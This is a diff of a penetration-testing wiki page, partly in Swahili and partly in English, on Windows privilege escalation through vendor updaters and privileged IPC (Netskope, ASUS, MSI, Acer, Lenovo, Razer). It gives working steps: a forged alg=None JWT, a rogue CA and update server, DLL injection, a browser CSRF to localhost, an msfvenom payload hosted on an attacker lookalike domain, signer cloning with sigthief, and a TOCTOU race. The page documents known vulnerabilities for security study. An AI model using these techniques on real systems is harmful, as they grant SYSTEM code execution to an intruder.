@@ -1,28 +1,28 @@
-# Kuitumia Enterprise Auto-Updaters na Privileged IPC vibaya (mf. Netskope, ASUS & MSI)
+# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Ukurasa huu unajumlisha aina ya Windows local privilege escalation chains zilizopatikana kwenye enterprise endpoint agents na updaters ambazo zinafichua low-friction IPC surface na privileged update flow. Mfano wa kuwakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo user mwenye low privileges anaweza kulazimisha enrollment kwenda kwenye server inayodhibitiwa na attacker kisha kutoa MSI mbaya ambayo SYSTEM service huisakinisha.
+Ukurasa huu unazalisha kwa ujumla darasa la local privilege escalation chains za Windows zinazopatikana katika enterprise endpoint agents na updaters ambazo hutoa low-friction IPC surface na privileged update flow. Mfano wa kuwakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo user mwenye low privilege anaweza kulazimisha enrollment kwenda kwa server inayodhibitiwa na attacker na kisha kuwasilisha malicious MSI ambayo service ya SYSTEM huinstall.
 
 Mawazo muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
-- Abuse privileged service’s localhost IPC ili kulazimisha re-enrollment au reconfiguration kwenda kwenye attacker server.
-- Implement vendor’s update endpoints, toa rogue Trusted Root CA, na elekeza updater kwenda kwenye malicious, “signed” package.
+- Abuse privileged service’s localhost IPC ili kulazimisha re-enrollment au reconfiguration kwenda kwa attacker server.
+- Implement update endpoints za vendor, deliver a rogue Trusted Root CA, na point updater kwenda kwenye malicious, “signed” package.
 - Evade weak signer checks (CN allow-lists), optional digest flags, na lax MSI properties.
-- Ikiwa IPC “encrypted”, pata key/IV kutoka kwa world-readable machine identifiers zilizohifadhiwa kwenye registry.
-- Ikiwa service inazuia callers kwa image path/process name, inject ndani ya process iliyo allow-listed au zindua moja ikiwa suspended na bootstrap DLL yako kupitia minimal thread-context patch.
+- Ikiwa IPC ni “encrypted”, derive the key/IV kutoka world-readable machine identifiers zilizohifadhiwa kwenye registry.
+- Ikiwa service inazuia callers kwa image path/process name, inject into an allow-listed process au spawn moja suspended na bootstrap DLL yako kupitia minimal thread-context patch.
 
 ---
-## 1) Kulazimisha enrollment kwenda kwenye attacker server kupitia localhost IPC
+## 1) Kulazimisha enrollment kwenda kwa attacker server kupitia localhost IPC
 
-Wakala wengi husafirisha user-mode UI process inayoongea na SYSTEM service kupitia localhost TCP kwa kutumia JSON.
+Wengi wa agents husafirisha user-mode UI process ambayo huwasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.
 
-Iliyoonekana kwenye Netskope:
+Ilionekana katika Netskope:
 - UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
 - IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN
 
 Exploit flow:
-1) Tengeneza JWT enrollment token whose claims control backend host (mf. AddonUrl). Tumia alg=None ili signature isiwe lazima.
-2) Tuma IPC message inayowaita provisioning command pamoja na JWT yako na tenant name:
+1) Craft token ya JWT enrollment ambayo claims zake hudhibiti backend host (mfano, AddonUrl). Tumia alg=None ili hakuna signature inayohitajika.
+2) Tuma IPC message ikiiita provisioning command pamoja na JWT yako na tenant name:
 ```json
 {
 "148": {
@@ -31,96 +31,98 @@ Exploit flow:
 }
 }
 ```
-3) Huduma inaanza kugonga rogue server yako kwa enrollment/config, mfano:
+3) Huduma inaanza kugonga rogue server yako kwa enrollment/config, kwa mfano:
 - /v1/externalhost?service=enrollment
 - /config/user/getbrandingbyemail
 
 Notes:
-- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).
+- Ikiwa caller verification ni path/name-based, anzisha request kutoka kwenye allow-listed vendor binary (ona §4).
 
 ---
 ## 2) Hijacking the update channel to run code as SYSTEM
 
-Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:
+Mara client inapoongea na server yako, implement expected endpoints na uielekeze kwenye attacker MSI. Typical sequence:
 
-1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, mfano:
+1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, kwa mfano:
 ```json
 {
 "clientUpdate": { "updateIntervalInMin": 1 },
 "check_msi_digest": false
 }
 ```
-2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
-3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.
+2) /config/ca/cert → Rudisha PEM CA certificate. Huduma huiinstall kwenye Local Machine Trusted Root store.
+3) /v2/checkupdate → Toa metadata inayoelekeza kwenye malicious MSI na fake version.
 
-Bypassing common checks seen in the wild:
-- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
-- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
-- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.
+Kuepuka common checks zinazoonekana kwa wingi:
+- Signer CN allow-list: huduma inaweza tu kucheck kama Subject CN ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye hiyo CN na kusign MSI.
+- CERT_DIGEST property: jumuisha benign MSI property inayoitwa CERT_DIGEST. Hakuna enforcement wakati wa install.
+- Optional digest enforcement: config flag (kwa mfano, check_msi_digest=false) huzima extra cryptographic validation.
 
-Result: the SYSTEM service installs your MSI from
+Matokeo: SYSTEM service huiinstall MSI yako kutoka
 C:\ProgramData\Netskope\stAgent\data\*.msi
-executing arbitrary code as NT AUTHORITY\SYSTEM.
+na ku-execute arbitrary code kama NT AUTHORITY\SYSTEM.
+
+Patch-bypass lesson: vendor akijibu kwa ku-allow-list seti ndogo ya “trusted” domains badala ya ku-authenticate source ya update kwa cryptographically, tafuta vendor-owned redirectors au reverse proxies zinazokuruhusu bado steer traffic. Katika Netskope's case, public follow-up research ilionyesha kwamba R129-era allow-list bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo iliproxy attacker-controlled Azure App Service content. Chukulia hostname allow-lists kama speed bump, si kama trust boundary.
 
 ---
 ## 3) Forging encrypted IPC requests (when present)
 
-From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
+Kuanzia R127, Netskope ilizungushia IPC JSON ndani ya field ya encryptData inayoonekana kama Base64. Reversing ilionyesha AES yenye key/IV zilizotokana na registry values zinazosomeka na user yeyote:
 - Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
 - IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID
 
-Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.
+Attackers wanaweza ku-reproduce encryption na kutuma valid encrypted commands kutoka standard user. Tip ya jumla: ikiwa agent ghafla “encrypts” IPC yake, tafuta device IDs, product GUIDs, install IDs chini ya HKLM kama material.
 
 ---
 ## 4) Bypassing IPC caller allow-lists (path/name checks)
 
-Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).
+Baadhi ya services hujaribu ku-authenticate peer kwa ku-resolve PID ya TCP connection na kulinganisha image path/name dhidi ya allow-listed vendor binaries zilizo chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).
 
-Two practical bypasses:
-- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
-- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.
+Mbinu mbili za practical bypass:
+- DLL injection ndani ya allow-listed process (kwa mfano, nsdiag.exe) na proxy IPC kutoka ndani yake.
+- Spawn allow-listed binary suspended na bootstrap proxy DLL yako bila CreateRemoteThread (ona §5) ili satisfy driver-enforced tamper rules.
 
 ---
 ## 5) Tamper-protection friendly injection: suspended process + NtContinue patch
 
-Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
-- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
-- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE
+Products mara nyingi husafirisha minifilter/OB callbacks driver (kwa mfano, Stadrv) ili ku-strip dangerous rights kutoka handles kwenda protected processes:
+- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
+- Thread: hupunguza hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE
 
-A reliable user-mode loader that respects these constraints:
-1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
-2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
-3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
-4) ResumeThread to trigger your stub in-process, loading your DLL.
+Reliable user-mode loader inayoheshimu constraints hizi:
+1) CreateProcess ya vendor binary na CREATE_SUSPENDED.
+2) Pata handles ambazo bado unaruhusiwa kuwa nazo: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au tu THREAD_RESUME ikiwa unapata code kwenye known RIP).
+3) Overwrite ntdll!NtContinue (au early, guaranteed-mapped thunk nyingine) na tiny stub inayoita LoadLibraryW kwenye DLL path yako, kisha irudi nyuma.
+4) ResumeThread ili ku-trigger stub yako ndani ya process, na ku-load DLL yako.
 
-Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.
+Kwa sababu hukutumia PROCESS_CREATE_THREAD wala PROCESS_SUSPEND_RESUME kwenye tayari-protected process (uli-create mwenyewe), policy ya driver inaridhika.
 
 ---
 ## 6) Practical tooling
-- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
-- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.
+- NachoVPN (Netskope plugin) hu-automate rogue CA, malicious MSI signing, na huhudumia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
+- UpSkope ni custom IPC client inayo-craft arbitrary (optionally AES-encrypted) IPC messages na kujumuisha suspended-process injection ili ku-origin kutoka kwenye allow-listed binary.
 
 ## 7) Fast triage workflow for unknown updater/IPC surfaces
 
-When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:
+Unapokutana na endpoint agent mpya au motherboard “helper” suite, workflow ya haraka mara nyingi inatosha kukuambia kama unaangalia promising privesc target:
 
-1) Enumerate loopback listeners and map them back to vendor processes:
+1) Enumerate loopback listeners na uzi-map kurudi kwa vendor processes:
 ```powershell
 Get-NetTCPConnection -State Listen |
 Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
 Select-Object LocalAddress,LocalPort,OwningProcess,
 @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
 ```
-2) Orodhesha candidate named pipes:
+2) Hesabu candidate named pipes:
 ```powershell
 [System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
 ```
-3) Chimba data ya uelekezaji inayotegemea registry inayotumiwa na seva za IPC zenye msingi wa plugin:
+3) Chimba data ya routing inayotegemea registry inayotumiwa na IPC servers za plugin-based:
 ```powershell
 Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
 Select-Object PSChildName
 ```
-4) Dondooa majina ya endpoint, keys za JSON, na command IDs kutoka kwenye user-mode client kwanza. Packed Electron/.NET frontends mara nyingi huvuja schema nzima:
+4) Toa majina ya endpoint, JSON keys, na command IDs kwanza kutoka kwa user-mode client. Packed Electron/.NET frontends mara nyingi huvuja full schema:
 ```powershell
 Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
 -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
@@ -131,23 +133,45 @@ Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\
 -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
 ```
 Patterns zinazostahili kupewa kipaumbele:
-- `CryptQueryObject`/certificate parsing bila `WinVerifyTrust` kawaida humaanisha “certificate ipo” ilichukuliwa kama “certificate ni trusted”, hivyo kuwezesha certificate cloning au hila nyingine za fake-signer.
-- Ukaguzi wa substring/suffix juu ya `Origin`, `Referer`, download URLs, majina ya process, au signer CNs si authentication. `contains(".vendor.com")` mara nyingi inaweza kutumiwa vibaya kwa attacker-controlled lookalike domains.
-- Ikiwa GUI ya low-privileged ndiyo inaamua “the file is trusted” na SYSTEM broker kwa urahisi hutumia tu matokeo hayo, patching au reimplementing client-side DLL/JS mara nyingi hupita boundary yote moja kwa moja (Razer-style split validation).
-- Ikiwa broker inanukuu payload kwenda `%TEMP%`/`C:\Windows\Temp` kisha hui-validate au kuischedule kutoka path hiyo, mara moja test kwa TOCTOU replacement windows na kwa sibling plugin modules zinazotoa alternate `ExecuteTask()` wrappers zenye checks dhaifu.
+- `CryptQueryObject`/certificate parsing bila `WinVerifyTrust` kwa kawaida humaanisha “certificate ipo” ilichukuliwa kama “certificate inatambulika”, na hivyo kuwezesha certificate cloning au hila nyingine za fake-signer.
+- Ukaguzi wa substring/suffix juu ya `Origin`, `Referer`, download URLs, majina ya process, au signer CNs si authentication. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya na attacker-controlled lookalike domains.
+- Ikiwa low-privileged GUI huamua “the file is trusted” na SYSTEM broker huchukua tu matokeo hayo, kupatch au kuireimplement client-side DLL/JS mara nyingi hupita boundary nzima kabisa (Razer-style split validation).
+- Ikiwa broker hunakili payload kwenda `%TEMP%`/`C:\Windows\Temp` kisha hui-validate au kuischedule kutoka path hiyo, jaribu mara moja TOCTOU replacement windows na sibling plugin modules zinazofichua alternate `ExecuteTask()` wrappers zenye checks dhaifu zaidi.
 
-Kwa targets zenye named-pipe nyingi, PipeViewer ni njia ya haraka ya kuona weak DACLs na remotely reachable pipes kabla hujaanza reversing protocol kwa undani.
+Kwa targets zenye named-pipe nyingi, PipeViewer ni njia ya haraka ya kubaini weak DACLs na pipes zinazoweza kufikiwa kwa mbali kabla hujaanza ku-reverse protocol kwa kina.
 
-Ikiwa target ina-authenticate callers kwa PID pekee, image path, au process name, chukulia hiyo kama speed bump badala ya boundary: injecting kwenye legitimate client, au kufanya connection kutoka kwa process iliyo kwenye allow-list, mara nyingi inatosha kuridhisha checks za server. Kwa named pipes hasa, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) inaeleza primitive hii kwa undani zaidi.
+Ikiwa target huwatambua callers kwa PID, image path, au process name pekee, chukulia hiyo kama speed bump badala ya boundary: injecting ndani ya legitimate client, au kufanya connection kutoka kwa process iliyo kwenye allow-list, mara nyingi inatosha kukidhi checks za server. Kwa named pipes hasa, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) inaeleza primitive hiyo kwa kina zaidi.
+
+---
+## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)
+
+Tofauti mpya inayostahili kuwindwa ni **signed-client RPC broker**: low-privileged Lenovo-signed desktop process huongea na SYSTEM service, na service hu-route JSON commands kwenda seti ya add-ins zilizoelezwa kwa XML chini ya `%ProgramData%`. Mara code execution ikifanikiwa **ndani ya accepted signed client yoyote**, kila `runas="system"` contract inakuwa sehemu ya attack surface yako.
+
+High-value primitives zilizoonekana katika utafiti wa Lenovo Vantage:
+- **Kumuamini caller kwa sababu imesainiwa na vendor**: watafiti walifikia authenticated context kwa kunakili Lenovo-signed EXE kwenda directory inayoweza kuandikwa na kukidhi DLL side-load (`profapi.dll`) ili arbitrary code iendeshe ndani ya client ambayo service tayari ilimuamini.
+- **Manifest-driven attack surface discovery**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hiyo ku-enumerate manifests hizo mara nyingi huonyesha verbs za kweli zenye privileges haraka kuliko ku-reverse broker yenyewe.
+- **Per-command bugs nyuma ya authenticated channel**: mara ukiwa ndani ya trusted client, public research ilipata path-traversal + race conditions katika update/install verbs, raw-SQL abuse katika privileged settings databases, na substring-based registry path checks zilizowezesha writes nje ya intended hive.
+
+Useful recon kwenye target:
+```powershell
+Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
+Select-String -Pattern 'runas="system"|<name>|<namespace>'
+```
+
+```powershell
+Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
+-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
+```
+Practical takeaway: wakati wowote helper suite inafichua broker ambayo kwanza huthibitisha **caller process** kisha ndipo husambaza amri nyingi za plugin/add-in, usisitishe baada ya bypass ya front-door trust check. Dump manifest/contract table na fuzz kila high-privilege verb kwa kujitegemea; authenticated channel kawaida huficha bugs kadhaa za second-stage.
 
 ---
 ## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)
 
-DriverHub inasafirisha user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 ambayo inatarajia browser calls zinazotoka kwenye https://driverhub.asus.com. Origin filter inafanya tu `string_contains(".asus.com")` juu ya Origin header na juu ya download URLs zilizo wazi kupitia `/asus/v1.0/*`. Hivyo host yoyote inayodhibitiwa na attacker kama `https://driverhub.asus.com.attacker.tld` hupita check hiyo na inaweza kutuma state-changing requests kutoka JavaScript. Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa bypass patterns za ziada.
+DriverHub inasafirisha user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 ambayo inatarajia browser calls zinazoja kutoka https://driverhub.asus.com. Origin filter kwa urahisi hufanya `string_contains(".asus.com")` juu ya header ya Origin na juu ya download URLs zilizofichuliwa na `/asus/v1.0/*`. Hivyo host yoyote inayodhibitiwa na attacker kama `https://driverhub.asus.com.attacker.tld` hupita check na inaweza kutoa state-changing requests kutoka JavaScript. Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa bypass patterns za ziada.
 
 Practical flow:
-1) Sajili domain inayojumuisha `.asus.com` na host webpage mbaya hapo.
-2) Tumia `fetch` au XHR kuita privileged endpoint (mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
+1) Register domain inayojumuisha `.asus.com` na host malicious webpage hapo.
+2) Tumia `fetch` au XHR kuita privileged endpoint (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
 3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonyesha schema hapa chini.
 ```javascript
 fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
@@ -156,89 +180,89 @@ headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
 });
 ```
-Hata PowerShell CLI iliyoonyeshwa hapa chini hufaulu hata wakati kichwa cha Origin kinapospoofiwa kuwa thamani inayoaminika:
+Hata PowerShell CLI iliyoonyeshwa hapa chini pia hufaulu wakati kichwa cha Origin kinapoigizwa kuwa thamani inayoaminika:
 ```powershell
 Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
 -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
 -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
 ```
-Utembelezi wowote wa browser kwenda kwenye site ya attacker kwa hiyo unakuwa 1-click (au 0-click kupitia `onload`) local CSRF inayomfanya SYSTEM helper ifanye kazi.
+Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.
 
 ---
 ## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)
 
-`/asus/v1.0/UpdateApp` hupakua arbitrary executables zilizofafanuliwa kwenye JSON body na kuzihifadhi kwenye `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitisho wa download URL hutumia tena same substring logic, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` hukubaliwa. Baada ya download, ADU.exe huangalia tu kwamba PE ina signature na kwamba Subject string inalingana na ASUS kabla ya kuirun – hakuna `WinVerifyTrust`, hakuna chain validation.
+`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.
 
-Ili kufanya flow hii iwe weaponized:
-1) Tengeneza payload (mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
-2) Clone signer wa ASUS ndani yake (mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
-3) Host `pwn.exe` kwenye domain inayofanana na `.asus.com` na trigger UpdateApp kupitia browser CSRF hapo juu.
+To weaponize the flow:
+1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
+2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
+3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.
 
-Kwa kuwa Origin na URL filters zote zinategemea substring, na signer check inalinganisha strings tu, DriverHub hupakua na kutekeleza attacker binary chini ya elevated context yake.
+Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.
 
 ---
-## 1) TOCTOU ndani ya updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)
+## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)
 
-SYSTEM service ya MSI Center ina expose TCP protocol ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) husafirisha `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
-1) Hunakili executable iliyotolewa kwenda `C:\Windows\Temp\MSI Center SDK.exe`.
-2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (certificate subject lazima iwe sawa na “MICRO-STAR INTERNATIONAL, CO., LTD.” na `WinVerifyTrust` ifanikiwe).
-3) Huutengeneza scheduled task inayorun temp file kama SYSTEM na attacker-controlled arguments.
+MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
+1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
+2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL, CO., LTD.” and `WinVerifyTrust` succeeds).
+3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.
 
-File iliyonakiliwa haifungwi kati ya verification na `ExecuteTask()`. Attacker anaweza:
-- Kutuma Frame A ikielekeza kwenye legitimate MSI-signed binary (inahakikisha signature check inapitisha na task inawekwa kwenye queue).
-- Kuirace na ujumbe wa Frame B unaorudiwa unaoelekeza kwenye malicious payload, na kuoverwrite `MSI Center SDK.exe` mara tu verification inapokamilika.
+The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
+- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
+- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.
 
-Scheduler ikianza, inaexecute payload iliyowekwa juu ya ile ya awali chini ya SYSTEM licha ya kuwa ilithibitisha original file. Exploitation ya kuaminika hutumia goroutines/threads mbili zinazospam CMD_AutoUpdateSDK mpaka TOCTOU window ishindwe.
+When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.
 
 ---
 ## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)
 
 ### MSI Center TCP command sets
-- Kila plugin/DLL inayoloadwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Bytes 4 za kwanza za frame huchagua component hiyo, hivyo attacker anaweza kuelekeza commands kwenye arbitrary modules.
-- Plugins zinaweza kufafanua task runners zao wenyewe. `Support\API_Support.dll` ina expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na moja kwa moja huita `API_Support.EX_Task::ExecuteTask()` bila **signature validation** – local user yeyote anaweza kuiweka kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata SYSTEM execution kwa uhakika.
-- Kusniff loopback kwa Wireshark au kuinstrument .NET binaries kwenye dnSpy haraka huonyesha Component ↔ command mapping; custom Go/ Python clients wanaweza kisha kurudia frames.
+- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
+- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
+- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.
 
 ### Acer Control Centre named pipes & impersonation levels
-- `ACCSvc.exe` (SYSTEM) ina expose `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake inaruhusu remote clients (mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na file path huita process-spawning routine ya service.
-- Client library huserialize magic terminator byte (113) pamoja na args. Dynamic instrumentation kwa Frida/`TsDotNetLib` (ona [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa instrumentation tips) huonyesha kwamba native handler inamap value hii kwenda `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
-- Kubadilisha 113 (`0x71`) kuwa 114 (`0x72`) huingia kwenye generic branch ambayo huhifadhi full SYSTEM token na kuweka high-integrity SID (`S-1-16-12288`). Binary inayozinduliwa kwa hiyo hu-run kama unrestricted SYSTEM, locally na cross-machine.
-- Changanya hilo na exposed installer flag (`Setup.exe -nocheck`) ili kuanzisha ACC hata kwenye lab VMs na kutumia pipe bila vendor hardware.
+- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
+- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
+- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
+- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.
 
-Bugs hizi za IPC zinaonyesha kwa nini localhost services lazima zitekeleze mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) na kwa nini kila module’s “run arbitrary binary” helper lazima ishiriki same signer verifications.
+These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.
 
 ---
 ## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)
 
-Razer Synapse 4 iliongeza another useful pattern kwenye family hii: user asiye na privilege ya juu anaweza kumuomba COM helper kuzindua process kupitia `RzUtility.Elevator`, wakati trust decision imewekwa kwa user-mode DLL (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya privileged boundary.
+Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.
